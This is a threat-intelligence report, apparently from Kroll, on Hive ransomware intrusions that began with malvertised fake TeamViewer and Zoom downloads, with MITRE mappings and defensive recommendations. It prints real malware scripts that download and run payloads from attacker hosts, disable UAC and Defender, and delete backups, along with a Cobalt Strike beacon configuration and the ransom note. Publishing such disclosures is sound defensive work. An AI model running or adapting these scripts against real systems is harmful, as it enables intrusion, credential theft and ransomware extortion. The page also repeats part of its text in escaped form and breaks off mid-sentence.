            &lt;p&gt;Review remote access tools&lt;/p&gt;
            &lt;/td&gt;
            &lt;td&gt;
            &lt;p&gt;Threat actors leverage legitimate remote access tools to maintain persistence. Ensure remote access is monitored and that only approved remote access tools exist in the environment.&lt;/p&gt;
            &lt;/td&gt;
        &lt;/tr&gt;
    &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;
&lt;/p&gt;

            &lt;/p&gt;

class="col-12 col-lg-8"><div class="row"><div class="component"><div class="component-content"><div class="container mx-auto py-[2rem] "><div class="container"><div class="row"><div class="container grid col-12 gap-[3.25rem]  undefined"><div class="flex flex-col gap-[2.5rem] false "></div></div><div class="col-12 font-light text-Black"><div class="rich-text"><p><em>Hive has been seized by law enforcement, but we're likely to still see these initial access methods and tactics used across other threat actor groups.</em></p>
<p>Kroll has observed an increase in Hive ransomware incidents across a wide range of industry verticals. A new trend of initial infection vector (IIV) has been identified by Kroll analysts that may relate to the increase of activity and the varying nature of targets. Across a number of incidents, the IIV was attributed to IT administrators looking to download common softwares from Google such as TeamViewer, Zoom and AnyDesk, and they were provided with advertisements for these tools at the top of their search results. We recently <a href="/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer">reported</a>&nbsp;on this trend, where threat actors were abusing Google Ads to deploy malware via downloads.</p>
<p>When these IT administrators downloaded the desired &ldquo;tools&rdquo; from the malicious ad links, Batloader was also unknowingly delivered. Batloader is an initial access malware utilized to deliver tools such as Zloader, Ursnif and Vidar to further establish the threat actor&rsquo;s foothold within a network. Cobalt Strike can then be installed to maintain command and control. Once the threat actor has acquired credentials and identified sensitive files for exfiltration, they are able to utilize common exfiltration tools such as WinSCP and <a href="/en/insights/publications/cyber/new-m365-business-email-compromise-attacks-with-rclone">Rclone</a>&nbsp;to extract a victim&rsquo;s data. The ransomware binary is then executed with a specific identifiable encryption key and this is used to create the ransom note named &ldquo;HOW_TO_DECRYPT.txt&rdquo; and appends a specific file extension related to a dropped key file within the root of C:\.</p>
<p>A login is provided for the victim to access the Hive &ldquo;Sales Department&rdquo; onion site, and if demands are not met, data is then shared on their &ldquo;Hive Leak&rdquo; onion site.</p>
<p>
</p>
<h2 style="font-size: 24px;">Timeline of Incident</h2>
<p style="text-align: center;"><img src="https://edge.sitecorecloud.io/krollllc17bf0-kroll6fee-proda464-0e9b/media/Kroll-Images/Insights/hive-ransomware-technical-analysis-initial-access-discovery-timeline.svg" style="height: 100%; width: 100%; margin-top: 0px; margin-bottom: 0px;" alt="Hive Ransomware Technical Analysis and Initial Access Discovery" /></p>
<p>
</p>
<h3 style="font-size: 20px;">Initial Exploit</h3>
<p>In a recent case, after the IT administrator searched for TeamViewer and clicked the advertisement link, they were directed to https://caroseyama[.]xyz/9hjLXZR?https://www.teamviewer[.]com/en/customer-support. This link then redirected to https://teamviewclouds[.]com/index.php. Our experts analyzed the teamviewclouds domain and identified a large number of similar typosquatted domains for a wide range of common software hosted on the same IP address and hosted by regprivate[.]ru.&nbsp; &nbsp; Most of these domains were inactive, which suggests that the threat actors are continually creating new advertisements. An installation file is then provided from https://dc444.4sync[.]com/download/fXx-c_iZ/InstallerV36__218_.zip, which is the Batloader .msi file. The file sharing provider 4sync has been identified across separate Batloader incidents and appears to serve the Batloader .msi download.</p>
<pre class="light"><code>zoomyclouds[.]com, zoomedes[.]com, zohosz[.]com, teamviewerq[.]com, teamviewer-cloudcomputing[.]com, teamviewclous[.]com, teamviewclouds[.]com, teamcloudcomputing[.]com, staroness[.]com, standartnotess[.]com, slackicorp[.]com, programmbatcheck[.]com, openofficee[.]com, logmein-cloud[.]com, logcloudmein[.]com, gimpimage[.]com, foxitr[.]com, fortinetq[.]com, fidelyclouds[.]com, evernotcorp[.]com, dom82[.]net, cloudsslack[.]com, anydeskos[.]com, anydeskis[.]com, anyclouddesk[.]com, adubecorp[.]com</code></pre>
<p>
</p>
<p style="text-align: center;">Figure 1: Example of Typosquatted domains associated with teamviewclouds[.]com</p>
<p>The installer itself installed <a rel="noopener noreferrer" href="https://www.novapdf.com/" target="_blank">novaPDF</a> by Softland rather than TeamViewer and dropped PowerShell scripts &ldquo;scrED95.ps1&rdquo; and &ldquo;pssEDC6.ps1&rdquo;. &ldquo;pssEDC6.ps1&rdquo; is a conversion script that creates the initial downloader script &ldquo;scrED95.ps1&rdquo;. This script downloads the initial Batloader script &ldquo;update.bat&rdquo; and sets the working directory to the user&rsquo;s appdata local directory. The scripts are executed by PowerShell as shown in figure 2.</p>
<pre class="light"><code>powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -File "C:\Users\user\AppData\Local\Temp\pssEDC6.ps1" -propFile "C:\Users\user\AppData\Local\Temp\msiED94.txt" -scriptFile "C:\Users\user\AppData\Local\Temp\scrED95.ps1" -scriptArgsFile "C:\Users\user\AppData\Local\Temp\scrED96.txt" -propSep " :&lt;-&gt;: " -testPrefix "_testValue."</code></pre>
<p>
</p>
<p style="text-align: center;">Figure 2: PowerShell command to create initial downloader</p>
<p>
</p>
<pre class="light"><code>Set-Location "$Env:USERPROFILE\AppData\Roaming"
Invoke-RestMethod -Uri https://cloudupdatesss[.]com/g5i0nq/index/e6a5614c379561c94004c531781ee1c5/?servername=msi -OutFile update.bat
Start-Process -WindowStyle hidden -FilePath "$Env:USERPROFILE\AppData\Roaming\update.bat</code></pre>
<p>
</p>
<p style="text-align: center;">Figure 3: scrED95.ps1</p>
<p>MITRE ATT&amp;CK: T1583.001: Acquire Domain Names<br />
MITRE ATT&amp;CK: T1608.004: Stage Capabilities - Drive-by Target<br />
MITRE ATT&amp;CK: T1588: Obtain Capabilities<br />
MITRE ATT&amp;CK: T1189: Drive-by Compromise</p>
<p>
</p>
<h3 style="font-size: 20px;">Toolkit Deployment and Escalation</h3>
<p>To maintain persistence and to gain increased privileges, Hive actors leverage Batloader to download Ursnif and Vidar, but also attempt to gain the highest privileges possible to install the malware. The initial Batloader script downloads &ldquo;requestadmin.bat&rdquo; and attempts to execute it with evaluated privileges by <a rel="noopener noreferrer" href="https://www.nirsoft.net/utils/nircmd.html" target="_blank">nircmd.exe</a>.</p>
<pre class="light"><code>powershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/f69af5bc8498d0ebeb37b801d450c046/?servername=msi -OutFile requestadmin.bat
powershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/c003996958c731652178c7113ad768b7/?servername=msi -OutFile nircmd.exe

cmd  /c nircmd elevatecmd exec hide "requestadmin.bat"
ping  127.0.0.1 -n 20</code></pre>
<p>
</p>
<p style="text-align: center;">Figure 4: update.bat</p>
<p>The &ldquo;requestadmin.bat&rdquo; then attempts to download further scripts named &ldquo;runanddelete.bat&rdquo; and &ldquo;scripttodo.ps1&rdquo;. The script itself also attempts to whitelist specific paths from Windows Defender before downloading <a rel="noopener noreferrer" href="https://nsudo.m2team.org/en-us/" target="_blank">Nsudo.exe</a>. Nsudo provides capabilities to execute binaries with elevated privileges, which are then used to edit the system registry to disable the user access control prompt and to disable task manager and other registry tools. The Windows power system settings tool Powercfg is then executed to disable sleep, which will allow the threat actor to maintain persistent access.</p>
<pre class="light"><code>set pop=%systemroot%
cd %APPDATA%
powershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/a3874ddb552a5b45cade5a2700d15587/?servername=msi -OutFile runanddelete.bat
cd %APPDATA%
powershell Invoke-WebRequest https://cloudupdatesss[.]com/g5i0nq/index/fa777fbbb8f055cb8bfcba6cb41c62e7/?servername=msi -OutFile scripttodo.ps1
start /b PowerShell -NoProfile -ExecutionPolicy Bypass -Command "&amp; './scripttodo.ps1'"
del nircmd.exe
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Roaming'
cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '%USERPROFILE%\AppData\Roaming\'

--- &lt;snip&gt;<snip> ---

powershell Invoke-WebRequest https://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe
set pop=%systemroot%
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
powercfg.exe /SETACVALUEINDEX SCHEME_CURRENT SUB_VIDEO VIDEOCONLOCK 1800
powercfg -change -standby-timeout-dc 3000
powercfg -change -standby-timeout-ac 3000

start /b "" cmd /c del "%~f0"&amp;exit /b
</snip></code></pre>
<p>
</p>
<p style="text-align: center;">Figure 5: requestadmin.bat</p>
<p>The script &ldquo;runanddelete.bat&rdquo; appears to be a modified open-source script named &ldquo;<a rel="noopener noreferrer" href="https://gist.github.com/Maximus5/a7fb0a11b3c33e5d96b0" target="_blank">get-admin.bat</a>&rdquo;. This script attempts to spawn the user access control prompt to gain the increased privileges to then spawn an Administrator shell, via a created file named &ldquo;getadmin.vbs&rdquo;. Once increased privileges are achieved, it then attempts to run Ursnif (d2ef5.exe).  Ursnif can be used to extract system information and seek to steal user credentials.</p>
<pre class="light"><code>@echo off

title Installing Packages 
:: BatchGotAdmin
::-------------------------------------
REM  --&gt; Check for permissions
&gt;nul 2&gt;&amp;1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --&gt; If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) &gt; "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 &gt;&gt; "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin

echo  Installing Necessary Packages.....Please Wait.....

cd %APPDATA%

start /b d2ef5.exe
</code></pre>
<p>
</p>
<p style="text-align: center;">Figure 6: runanddelete.bat</p>
<p>The script &ldquo;scripttodo.ps1&rdquo; initially installs GNU Privacy Guard for Windows (&ldquo;<a rel="noopener noreferrer" href="https://www.gpg4win.org/" target="_blank">Gpg4Win</a>&rdquo;), which is a file encryption software. Vidar binaries are then downloaded and decrypted by Gpg4Win along with a further attempt to download Nsudo.exe. The Vidar binaries are then executed, likely in an attempt to further gather system information and to gather credentials. The script also creates exclusions in the registry to prevent Windows Defender alerting on execution.</p>
<pre class="light"><code>param
	(
		[Parameter(Mandatory)]
		[ValidateNotNullOrEmpty()]
		[string]$DownloadFolderPath,
		
		[Parameter()]
		[ValidateNotNullOrEmpty()]
		[string]$DownloadUrl = 'http://files.gpg4win[.]org/gpg4win-2.2.5.exe'
		
	)

--- &lt;snip&gt;<snip> ---

if ($Condition_All ) 
{
    $URL = "https://cloudupdatesss[.]com/t1mw0r/index/d2ef590c0310838490561a205469713d/?servername=msi&amp;arp="+ $IP_count + "&amp;domain=" + $UserDomain + "&amp;hostname=" + $UserPCname
   $URL1 = "https://cloudupdatesss[.]com/t1mw0r/index/i850c923db452d4556a2c46125e7b6f2/?servername=msi&amp;arp="+ $IP_count + "&amp;domain=" + $UserDomain + "&amp;hostname=" + $UserPCname
   $URL2 = "https://cloudupdatesss[.]com/t1mw0r/index/b5e6ec2584da24e2401f9bc14a08dedf/?servername=msi&amp;arp="+ $IP_count + "&amp;domain=" + $UserDomain + "&amp;hostname=" + $UserPCname
		
	Invoke-WebRequest $URL -outfile p9d2s.exe.gpg
	Invoke-WebRequest $URL1 -outfile p9d2.bat
	Invoke-WebRequest $URL2 -outfile ata.exe.gpg
}

--- &lt;snip&gt;<snip> ---

Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$uri = 'https://raw.githubusercontent.com/adbertram/Random-PowerShell-Work/master/Security/GnuPg.psm1'
$moduleFolderPath = 'C:\Program Files\WindowsPowerShell\Modules\GnuPg'
$null = New-Item -Path $moduleFolderPath -Type Directory
Invoke-WebRequest -Uri $uri -OutFile (Join-Path -Path $moduleFolderPath -ChildPath 'GnuPg.psm1')
$env:APPDATA
Install-GnuPG -DownloadFolderPath $env:APPDATA
echo "START"
Add-MpPreference -ExclusionExtension &ldquo;exe&rdquo;
Add-MpPreference -ExclusionExtension &ldquo;dll&rdquo;
Remove-Encryption -FolderPath $env:APPDATA -Password '105b'
Invoke-WebRequest https://raw.githubusercontent[.]com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -outfile Nsudo.exe

.\p9d2s.exe
.\ata.exe
.\p9d2.bat</snip></snip></code></pre>
<p>
</p>
<p style="text-align: center;">Figure 7: scripttodo.ps1 snippets</p>
<p>MITRE ATT&amp;CK: T1059: Command and Scripting Interpreter<br />
MITRE ATT&amp;CK: T1064: Scripting<br />
MITRE ATT&amp;CK: T1548.002: Bypass User Account Control<br />
MITRE ATT&amp;CK: T1222: File and Directory Permissions Modification<br />
MITRE ATT&amp;CK: T1583.001: Acquire Domain Names<br />
MITRE ATT&amp;CK: T1027: Obfuscated Files<br />
MITRE ATT&amp;CK: T1056: Input Capture</p>
<p>The post-exploitation tool Cobalt Strike is often leveraged to provide command and control, utilizing both HTTP and SMB beacons to move laterally and report back to the threat actor&rsquo;s infrastructure. </p>
<pre class="light"><code>{
  "BeaconType": [
    "HTTP"
  ],
  "Port": 80,
  "SleepTime": 45000,
  "MaxGetSize": 1403644,
  "Jitter": 37,
  "C2Server": "softeruplive[.]com,/jquery-3.3.1.min.js",
  "HttpPostUri": "/jquery-3.3.2.min.js",
  "Malleable_C2_Instructions": [
    "Remove 1522 bytes from the end",
    "Remove 84 bytes from the beginning",
    "Remove 3931 bytes from the beginning",
    "Base64 URL-safe decode",
    "XOR mask w/ random key"
  ],
  "SpawnTo": "AAAAAAAAAAAAAAAAAAAAAA==",
  "HttpGet_Verb": "GET",
  "HttpPost_Verb": "POST",

--- &lt;SNIP&gt;<snip> ---</snip></code></pre>
<p>
</p>
<p style="text-align: center;">Figure 8: Cobalt Strike HTTP beacon</p>
<p>MITRE ATT&amp;CK: T1001: Data Obfuscation<br />
MITRE ATT&amp;CK: T1573.001: Encrypted Channel: Symmetric Cryptography</p>
<p>If required, the threat actors have also used minidump and ProcDump to dump the LSASS process. This is likely an attempt to dump NTLM credential hashes for password cracking, or for pass the hash techniques. PowerSploit has also been identified with attempts to run &ldquo;Invoke-Kerberoast&rdquo; to gain Kerberos ticket hashes for service accounts. This would likely provide the threat actor with increased privileges or access if successful.</p>
<p>MITRE ATT&amp;CK: T1003.001: Credential Dumping &ndash; LSASS Memory<br />
MITRE ATT&amp;CK: T1558.003: Kerberoasting<br />
MITRE ATT&amp;CK: T1550: Use Alternate Authentication Material</p>
<p>Common remote access software such as Splashtop can be installed via Cobalt Strike to provide a persistent, seemingly legitimate access to the network. This also allows the threat actor to conduct hands-on operations. Remote Desktop Protocol (RDP) is used with legitimate accounts to navigate across the network.</p>
<p>MITRE ATT&amp;CK: T1219: Remote Access Software<br />
MITRE ATT&amp;CK: T1021: Remote Services</p>
<p>
</p>
<h3 style="font-size: 20px;">Internal Scouting</h3>
<p>Once the threat actor gains a foothold within the network, Kroll has observed the use of tools such as <a rel="noopener noreferrer" href="https://attack.mitre.org/software/S0552/" target="_blank">ADFind</a> to identify accounts and servers. Other common tools such as nslookup and whoami have also been used to gain initial system information.</p>
<p>The Exchange PowerShell module Get-DomainController has also been identified when leveraging Cobalt Strike to execute commands. This module provides information on the domain controller for the local domain. </p>
<pre class="light"><code>powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBzAHQAOgA3ADUANwAyAC8AJwApADsAIABHAGUAdAAtAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIA

---Decoded Base64 string---
IEX (New-Object Net.Webclient).DownloadString('http://localhost:7572/'); Get-DomainController</code></pre>
<p>
</p>
<p style="text-align: center;">Figure 9: Example of Cobalt Strike commands</p>
<p>MITRE ATT&amp;CK: T1482: Domain Trust Discovery<br />
MITRE ATT&amp;CK: T1087: Account Discovery<br />
MITRE ATT&amp;CK: T1016: System Network Configuration Discovery</p>
<p>
</p>
<h3 style="font-size: 20px;">Mission Execution</h3>
<p>The threat actors look to identify sensitive files for exfiltration before encrypting devices by using tools such as Rclone to automate data extraction to cloud storage. Kroll has observed that threat actors have searched for files using PowerShell and manual traversal across files.</p>
<p>MITRE ATT&amp;CK: T1005: Data from Local System<br />
MITRE ATT&amp;CK: T1567.002: Exfiltration Over Web Service : Exfiltration to Cloud Storage<br />
MITRE ATT&amp;CK: T1020: Automate Exfiltration</p>
<p>To push the ransomware binary across the network, the sysinternals tool PsExec has been leveraged as well as custom scripts to deploy the encryptor. The ransomware binary itself appears to come in both 64 and 32 bit versions. To encrypt, the binary requires the login and password ".\windows_x64_encrypt.exe -u login:password&rdquo;. There are other options available for file encryption including:</p>
<ul style="margin-left: 40px;">
    <li>-local-only: Encrypt only local files.</li>
    <li>-no-discovery: Do not look for network shares.</li>
    <li>-explicit-only: Encrypt specific directories.</li>
</ul>
<p>By default, the binary prevents recovery by deleting volume shadow copies &ldquo;vssadmin.exe delete shadows /all /quiet&rdquo; and deletes system backups with &ldquo;wbadmin.exe delete systemstatebackup&rdquo; and &ldquo;wbadmin.exe delete catalog-quiet&rdquo; before preventing recovery from boot with &ldquo;\bcdedit.exe /set {default} recoveryenabled No&rdquo; and &ldquo;bcdedit.exe" /set {default} bootstatuspolicy ignoreallfailures&rdquo;. <a rel="noopener noreferrer" href="https://www.microsoft.com/en-us/security/blog/2022/07/05/hive-ransomware-gets-upgrades-in-rust/" target="_blank">The binary encrypts files</a>, except for &ldquo;.lnk&rdquo; files and binaries within &ldquo;C:\windows&rdquo;, before generating two key files in the root of C:\. The key files also determine the extension string added to the encrypted files along with a base64 encoded pointer.</p>
<pre class="light"><code>Your network has been breached and all data were encrypted.                    
Personal data, financial reports and important documents are ready to disclose.

To decrypt all the data and to prevent exfiltrated files to be disclosed at    
http://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd[.]onion/         
you will need to purchase our decryption software.   
                          
Please contact our sales department at:   
                                     
   http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd[.]onion/      
   
      Login: &lt;redacted&gt;<redacted> 
      Password: &lt;redacted&gt;<redacted>
	  
To get an access to .onion websites download and install Tor Browser at:       
   https://www.torproject[.]org/ (Tor Browser is not related to us) 
   
   
Follow the guidelines below to avoid losing your data:   
                      
 - Do not modify, rename or delete *.key files. Your data will be              
   undecryptable.                                                              
 - Do not modify or rename encrypted files. You will lose them.                
 - Do not report to the Police, FBI, etc. They don't care about your business. 
   They simply won't allow you to pay. As a result you will lose everything.   
 - Do not hire a recovery company. They can't decrypt without the key.         
   They also don't care about your business. They believe that they are        
   good negotiators, but it is not. They usually fail. So speak for yourself.  
 - Do not reject to purchase. Exfiltrated files will be publicly disclosed.
</redacted></redacted></code></pre>
<p>
</p>
<p style="text-align: center;">Figure 10: HOW_TO_DECRYPT.txt</p>
<p>MITRE ATT&amp;CK: T1570 : Lateral Tool Transfer<br />
MITRE ATT&amp;CK: T1490 : Inhibit System Recovery<br />
MITRE ATT&amp;CK: T1486 : Data Encrypted for Impact</p>
<p>Once data has been extracted and encrypted, victims are directed to their customer page to negotiate the ransom fee. If a fee is not agreed, then victims could be placed onto their shaming site: &ldquo;HiveLeaks.&rdquo;</p>
<p style="text-align: center;"><img src="https://edge.sitecorecloud.io/krollllc17bf0-kroll6fee-proda464-0e9b/media/Kroll-Images/Insights/hive-ransomware-technical-analysis-initial-access-discovery-hiveleaks.png" style="height: 100%; width: 100%; margin-top: 0px; margin-bottom: 0px;" alt="Hive Ransomware Technical Analysis and Initial Access Discovery" /></p>

<h2 style="font-size: 24px;">Recommendations</h2>
<p>Kroll has identified recommendations relating to this alert:</p>
<table style="width: 100%; height: 100%;">
    <tbody>
        <tr>
            <td style="text-align: left; vertical-align: middle;">
            <p style="text-align: center;"><strong>Recommendation</strong></p>
            </td>
            <td>
            <p style="text-align: center;"><strong>Observation</strong></p>
            </td>
        </tr>
        <tr>
            <td>
            <p>Monitor PowerShell execution</p>
            <p>Ensure PowerShell is logged, and create detections for encoded script execution.</p>
            </td>
            <td>
            <p>The threat actor utilized Cobalt Strike. Monitoring PowerShell execution can identify malicious activity associated with Cobalt Strike.
            </p>
            </td>
        </tr>
        <tr>
            <td>
            <p>Enable credential guard</p>
            <p><a rel="noopener noreferrer" href="https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard" target="_blank">Windows Credential Guard</a> can provide protection against password extraction and other authentication attacks.</p>
            </td>
            <td>
            <p>The threat actor dumped LSASS and conducted Kerberos attacks. Credential guard can offer some protection against these attacks.</p>
            </td>
        </tr>
        <tr>
            <td>
            <p>Audit user, administrator and service accounts</p>
            <p>Ensure accounts have the correct access and privileges. Implement the principle of least privilege.</p>
            </td>
            <td>
            <p>The threat actor is often able to install tools on user endpoints. Limiting the privileges of users can prevent a threat actor from installing malicious software.</p>
            </td>
        </tr>
        <tr>
            <td>
            <p>Implement multi-factor authentication</p>
            <p>Multi-factor authentication can restrict access to sensitive areas and can prevent lateral movement.</p>
            </td>
            <td>
            <p>Enabling multi-factor authentication can prevent a threat actor from moving laterally and accessing sensitive data.</p>
            </td>
        </tr>
        <tr>
            <td>
            <p>Review backup strategies</p>
            <p>Ensure multiple backups are taken and at least one backup is isolated from the network.</p>
            </td>
            <td style="text-align: left; vertical-align: middle;">
            <p>As a ransomware actor&rsquo;s main aim is to disrupt business, ensuring a viable backup and recovery strategy is in place can allow a business to recover quickly.</p>
            <p>
            </p>
            </td>
        </tr>
        <tr>
            <td>
            <p>Review remote access tools</p>
            </td>
            <td>
            <p>Threat actors leverage legitimate remote access tools to maintain persistence. Ensure remote access is monitored and that only approved remote access tools exist in the environment.</p>
            </td>
        </tr>
    </tbody>
</table>
<p>
</p>

A new trend of initial infection vector (IIV) has been identified by Kroll analysts that may relate to the increase of activity and the varying nature of targets. Across a number of incidents, the IIV was attributed to IT administrators looking to download common softwares from Google such as TeamViewer, Zoom and AnyDesk, and they were provided with advertisements for these tools at the top of their search results. We recently \u003ca href=\"/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer\"\u003ereported\u003c/a\u003e\u0026nbsp;on this trend, where threat actors were abusing Google Ads to deploy malware via downloads.\u003c/p\u003e\n\u003cp\u003eWhen these IT administrators downloaded the desired \u0026ldquo;tools\u0026rdquo; from the malicious ad links, Batloader was also unknowingly delivered. Batloader is an initial access malware utilized to deliver tools such as Zloader, Ursnif and Vidar to further establish the threat actor\u0026rsquo;s foothold within a network. Cobalt Strike can then be installed to maintain command and control. Once the threat actor has acquired credentials and identified sensitive files for exfiltration, they are able to utilize common exfiltration tools such as WinSCP and \u003ca href=\"/en/insights/publications/cyber/new-m365-business-email-compromise-attacks-with-rclone\"\u003eRclone\u003c/a\u003e\u0026nbsp;to extract a victim\u0026rsquo;s data. The ransomware binary is then executed with a specific identifiable encryption key and this is used to create the ransom note named \u0026ldquo;HOW_TO_DECRYPT.txt\u0026rdquo; and appends a specific file extension related to a dropped key file within the root of C:\\.\u003c/p\u003e\n\u003cp\u003eA login is provided for the victim to access the Hive \u0026ldquo;Sales Department\u0026rdquo; onion site, and if demands are not met, data is then shared on their \u0026ldquo;Hive Leak\u0026rdquo; onion site.\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch2 style=\"font-size: 24px;\"\u003eTimeline of Incident\u003c/h2\u003e\n\u003cp style=\"text-align: center;\"\u003e\u003cimg src=\"https://edge.sitecorecloud.io/krollllc17bf0-kroll6fee-proda464-0e9b/media/Kroll-Images/Insights/hive-ransomware-technical-analysis-initial-access-discovery-timeline.svg?h=100\u0026amp;w=100\" style=\"height: 100%; width: 100%; margin-top: 0px; margin-bottom: 0px;\" alt=\"Hive Ransomware Technical Analysis and Initial Access Discovery\" /\u003e\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch3 style=\"font-size: 20px;\"\u003eInitial Exploit\u003c/h3\u003e\n\u003cp\u003eIn a recent case, after the IT administrator searched for TeamViewer and clicked the advertisement link, they were directed to https://caroseyama[.]xyz/9hjLXZR?https://www.teamviewer[.]com/en/customer-support. This link then redirected to https://teamviewclouds[.]com/index.php. Our experts analyzed the teamviewclouds domain and identified a large number of similar typosquatted domains for a wide range of common software hosted on the same IP address and hosted by regprivate[.]ru.\u0026nbsp; \u0026nbsp; Most of these domains were inactive, which suggests that the threat actors are continually creating new advertisements. An installation file is then provided from https://dc444.4sync[.]com/download/fXx-c_iZ/InstallerV36__218_.zip, which is the Batloader .msi file. The file sharing provider 4sync has been identified across separate Batloader incidents and appears to serve the Batloader .msi download.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003ezoomyclouds[.]com, zoomedes[.]com, zohosz[.]com, teamviewerq[.]com, teamviewer-cloudcomputing[.]com, teamviewclous[.]com, teamviewclouds[.]com, teamcloudcomputing[.]com, staroness[.]com, standartnotess[.]com, slackicorp[.]com, programmbatcheck[.]com, openofficee[.]com, logmein-cloud[.]com, logcloudmein[.]com, gimpimage[.]com, foxitr[.]com, fortinetq[.]com, fidelyclouds[.]com, evernotcorp[.]com, dom82[.]net, cloudsslack[.]com, anydeskos[.]com, anydeskis[.]com, anyclouddesk[.]com, adubecorp[.]com\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 1: Example of Typosquatted domains associated with teamviewclouds[.]com\u003c/p\u003e\n\u003cp\u003eThe installer itself installed \u003ca rel=\"noopener noreferrer\" href=\"https://www.novapdf.com/\" target=\"_blank\"\u003enovaPDF\u003c/a\u003e by Softland rather than TeamViewer and dropped PowerShell scripts \u0026ldquo;scrED95.ps1\u0026rdquo; and \u0026ldquo;pssEDC6.ps1\u0026rdquo;. \u0026ldquo;pssEDC6.ps1\u0026rdquo; is a conversion script that creates the initial downloader script \u0026ldquo;scrED95.ps1\u0026rdquo;. This script downloads the initial Batloader script \u0026ldquo;update.bat\u0026rdquo; and sets the working directory to the user\u0026rsquo;s appdata local directory. The scripts are executed by PowerShell as shown in figure 2.\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003epowershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -File \"C:\\Users\\user\\AppData\\Local\\Temp\\pssEDC6.ps1\" -propFile \"C:\\Users\\user\\AppData\\Local\\Temp\\msiED94.txt\" -scriptFile \"C:\\Users\\user\\AppData\\Local\\Temp\\scrED95.ps1\" -scriptArgsFile \"C:\\Users\\user\\AppData\\Local\\Temp\\scrED96.txt\" -propSep \" :\u0026lt;-\u0026gt;: \" -testPrefix \"_testValue.\"\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 2: PowerShell command to create initial downloader\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cpre class=\"light\"\u003e\u003ccode\u003eSet-Location \"$Env:USERPROFILE\\AppData\\Roaming\"\nInvoke-RestMethod -Uri https://cloudupdatesss[.]com/g5i0nq/index/e6a5614c379561c94004c531781ee1c5/?servername=msi -OutFile update.bat\nStart-Process -WindowStyle hidden -FilePath \"$Env:USERPROFILE\\AppData\\Roaming\\update.bat\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003cp style=\"text-align: center;\"\u003eFigure 3: scrED95.ps1\u003c/p\u003e\n\u003cp\u003eMITRE ATT\u0026amp;CK: T1583.001: Acquire Domain Names\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1608.004: Stage Capabilities - Drive-by Target\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1588: Obtain Capabilities\u003cbr /\u003e\nMITRE ATT\u0026amp;CK: T1189: Drive-by Compromise\u003c/p\u003e\n\u003cp\u003e\n\u003c/p\u003e\n\u003ch3 style=\"font-size: 20px;\"\u003eToolkit Deployment and Escalation\u003c/h3\u003e\n\u003cp\u003eTo maintain persistence and to gain increased privileges, Hive actors leverage Batloader to download Ursnif and Vidar, but also attempt to gain the highest privileges possible to install the malware. The initial Batloader script downloads \u0026ldquo;requestadmin.bat\u0026rdquo; and 